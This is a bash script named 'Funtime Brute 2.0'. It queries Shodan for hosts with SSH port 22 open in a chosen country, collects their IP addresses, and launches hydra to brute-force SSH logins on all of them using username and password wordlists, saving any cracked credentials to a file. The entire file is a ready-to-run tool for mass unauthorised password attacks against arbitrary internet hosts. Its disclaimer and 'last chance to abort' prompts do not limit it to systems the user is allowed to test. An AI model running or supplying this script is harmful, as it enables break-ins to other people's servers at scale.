#!/bin/bash
echo "Funtime Brute 2.0 Initializing now"
echo "Please use this responsibly"
echo "I am not responsible for any bad decisions you make"
/bin/sleep 10

## asks for API Key for shodan
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:22,Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $1

 wc -l < $1 && echo "Targets Loaded"

/bin/sleep 5
echo "Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 10
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=10; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -L $ulvar -vV -P $pwvar -M $1 -o $2 -t 4 ssh 
##outputs file to current directory#
echo "File saved in: ${PWD}"
